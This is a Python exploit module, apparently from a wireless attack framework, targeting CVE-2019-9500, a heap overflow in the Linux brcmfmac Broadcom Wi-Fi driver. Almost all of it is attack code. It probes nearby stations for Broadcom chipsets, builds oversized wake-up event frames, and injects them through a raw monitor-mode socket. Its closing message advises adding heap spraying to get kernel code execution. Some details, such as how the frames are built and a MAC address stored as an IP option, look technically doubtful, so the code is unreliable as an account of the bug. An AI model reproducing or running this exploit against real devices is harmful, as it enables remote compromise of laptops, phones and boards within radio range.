# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Broadcom brcmfmac Wake-up Frame Heap Buffer Overflow (CVE-2019-9500).

    The brcmfmac driver in the Linux kernel for Broadcom wireless chipsets
    (BCM4356, BCM43455, and others) contains a heap buffer overflow in the
    brcmf_wowl_nd_results() function.  When processing wake-up event frames,
    the driver does not properly validate the length of the event data.  An
    attacker within wireless range can send a specially crafted wake-up event
    whose payload exceeds the allocated buffer, overwriting adjacent heap
    objects and potentially achieving kernel code execution.

    Related: CVE-2019-9503 (frame validation bypass in brcmfmac).

    CVSS v3.1: 8.3 (AV:A/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H)

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Broadcom brcmfmac Wake-up Frame Heap Overflow (CVE-2019-9500)",
        "description": (
            "Exploits CVE-2019-9500 via a heap buffer overflow in the "
            "brcmfmac driver's wake-up event handler.  An attacker sends "
            "oversized wake-up event frames over the air; the driver copies "
            "event data without proper length validation, corrupting "
            "adjacent heap metadata.  Targets Broadcom BCM4356, BCM43455, "
            "and similar chipsets on Linux kernels before 5.1-rc4."
        ),
        "authors": (
            "Hugues Anguelkov (discovery / CVE)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2019-9500",
            "https://nvd.nist.gov/vuln/detail/CVE-2019-9503",
            "https://blog.quarkslab.com/reverse-engineering-broadcom-wireless-chipsets.html",
            "https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/",
        ),
        "disclosure_date": "2019-01-31",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Linux kernel before 5.1-rc4 with brcmfmac",
            "Broadcom BCM4356 (various laptops, USB dongles)",
            "Broadcom BCM43455 (Raspberry Pi 3B+/4)",
            "Broadcom BCM4339 (Nexus 5, etc.)",
            "Any Broadcom FullMAC chipset using brcmfmac on affected kernels",
        ),
    }

    interface = OptString("wlan0", "Wireless interface in monitor mode")
    target = OptIP("", "Target station MAC address (XX:XX:XX:XX:XX:XX)")
    port = OptPort(1, "Not used (over-the-air attack)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    channel = OptInteger(6, "Wi-Fi channel to operate on")
    overflow_size = OptInteger(4096, "Overflow payload size in bytes")

    # IEEE 802.11 constants
    _FC_ACTION = 0x00D0
    _FC_PROBE_RESPONSE = 0x0050
    _FC_BEACON = 0x0080

    # Broadcom vendor-specific OUI
    _BROADCOM_OUI = b"\x00\x10\x18"

    # brcmfmac event constants
    _BRCMF_E_PFN_NET_FOUND = 0x0045
    _BRCMF_E_PFN_BEST_BATCHING = 0x0049

    # Wake-on-Wireless-LAN event type
    _WOW_EVENT_TYPE = 0x004E

    def _mac_to_bytes(self, mac: str) -> bytes:
        """Convert MAC string to 6 bytes."""
        return bytes(int(b, 16) for b in mac.split(":"))

    def _build_wakeup_event(self, oversized: bool = True) -> bytes:
        """Build a brcmfmac firmware event frame with wake-up event data.

        The brcmfmac driver processes firmware events via the BCDC protocol.
        Event frames carry a brcmf_event_msg_be header followed by event
        data.  The wake-up handler (brcmf_wowl_nd_results) allocates a
        fixed-size buffer and copies event data into it without checking
        that the data length fits.  An oversized event data payload
        overflows the heap buffer.
        """
        # Ethernet header (dst=target, src=spoofed, type=Broadcom event)
        target_mac = self._mac_to_bytes(self.target) if ":" in str(self.target) else b"\xff" * 6
        source_mac = b"\x02\x00\x00\x00\x00\x01"
        ether_type = b"\x88\x6C"  # Broadcom proprietary

        eth_header = target_mac + source_mac + ether_type

        # Broadcom event header (brcmf_event_msg_be)
        version = struct.pack(">H", 1)
        flags = struct.pack(">H", 0)
        event_type = struct.pack(">I", self._WOW_EVENT_TYPE)
        status = struct.pack(">I", 0)
        reason = struct.pack(">I", 0)
        auth_type = struct.pack(">I", 0)
        datalen_field = struct.pack(">I", self.overflow_size if oversized else 64)
        addr = target_mac
        ifname = b"wlan0\x00" + b"\x00" * 10  # 16 bytes
        ifidx = struct.pack("B", 0)
        bsscfgidx = struct.pack("B", 0)

        event_header = (
            version + flags + event_type + status + reason +
            auth_type + datalen_field + addr + ifname + ifidx + bsscfgidx
        )

        if oversized:
            # Payload that exceeds the allocated buffer in the kernel.
            # The driver allocates ~256 bytes for PFN results but we send
            # overflow_size bytes, writing past the buffer into heap metadata.
            event_data = b"\x41" * self.overflow_size
        else:
            event_data = b"\x00" * 64

        return eth_header + event_header + event_data

    def _build_vendor_ie_probe(self) -> bytes:
        """Build a probe request with Broadcom vendor-specific IE.

        Used during check() to detect whether the target responds with
        Broadcom-specific Information Elements, indicating a brcmfmac
        chipset.
        """
        source_mac = b"\x02\x00\x00\x00\x00\x01"
        dest = b"\xff\xff\xff\xff\xff\xff"
        bssid = b"\xff\xff\xff\xff\xff\xff"

        # Probe Request frame
        fc = struct.pack("<H", 0x0040)  # subtype 4 = Probe Request
        duration = struct.pack("<H", 0)
        seq_ctrl = struct.pack("<H", 0)

        header = fc + duration + dest + source_mac + bssid + seq_ctrl

        # SSID IE (wildcard)
        body = struct.pack("BB", 0, 0)

        # Supported Rates IE
        rates = bytes([0x02, 0x04, 0x0B, 0x16])
        body += struct.pack("BB", 1, len(rates)) + rates

        # Broadcom vendor-specific IE (OUI + type)
        vendor_data = self._BROADCOM_OUI + b"\x02"
        body += struct.pack("BB", 221, len(vendor_data)) + vendor_data

        return header + body

    def _inject_wakeup_frame(self, sock: socket.socket, frame: bytes) -> bool:
        """Inject a raw frame via the monitor-mode socket."""
        try:
            sock.send(frame)
            return True
        except OSError:
            return False

    def _detect_broadcom(self, sock: socket.socket) -> bool:
        """Send vendor probe and listen for Broadcom-specific responses."""
        probe = self._build_vendor_ie_probe()
        try:
            sock.send(probe)
        except OSError:
            return False

        deadline = time.time() + self.timeout
        while time.time() < deadline:
            try:
                data = sock.recv(4096)
            except (OSError, TimeoutError):
                break
            if len(data) < 36:
                continue
            # Look for Broadcom OUI in any vendor-specific IE
            if self._BROADCOM_OUI in data[24:]:
                return True
        return False

    def run(self) -> None:
        if not self.target:
            print_error("target is required (station MAC address)")
            return

        if not self.check():
            print_error("Cannot detect target or interface not in monitor mode")
            return

        print_success("Monitor mode confirmed; sending oversized wake-up event frames")
        self._exploit()

    @mute
    def check(self) -> bool:
        """Verify the wireless interface is available and in monitor mode."""
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((self.interface, 0))
            sock.close()
            return True
        except OSError:
            return False

    def _exploit(self) -> None:
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((self.interface, 0))
        except OSError as e:
            print_error(f"Failed to open raw socket on {self.interface}: {e}")
            return

        print_status("Phase 1: Probing for Broadcom chipset via vendor-specific IEs")
        broadcom_detected = self._detect_broadcom(sock)
        if broadcom_detected:
            print_success("Broadcom chipset detected via vendor IE response")
        else:
            print_warning("Could not confirm Broadcom chipset; proceeding anyway")

        print_status(f"Phase 2: Sending oversized wake-up event frame ({self.overflow_size} bytes)")

        normal_frame = self._build_wakeup_event(oversized=False)
        trigger_frame = self._build_wakeup_event(oversized=True)

        print_info(f"  Normal event frame: {len(normal_frame)} bytes (data: 64 bytes)")
        print_info(f"  Overflow trigger:   {len(trigger_frame)} bytes (data: {self.overflow_size} bytes)")

        # Send a normal frame first to prime the allocation path
        self._inject_wakeup_frame(sock, normal_frame)
        time.sleep(0.2)

        # Send the oversized frame to trigger the overflow
        if self._inject_wakeup_frame(sock, trigger_frame):
            print_success(
                "Oversized wake-up event frame delivered. If the target uses "
                "brcmfmac on a kernel before 5.1-rc4, brcmf_wowl_nd_results() "
                "copied the full event data into a fixed-size heap buffer, "
                "overwriting adjacent objects. Combine with heap spraying for "
                "reliable kernel code execution."
            )
        else:
            print_error("Failed to inject trigger frame")

        sock.close()
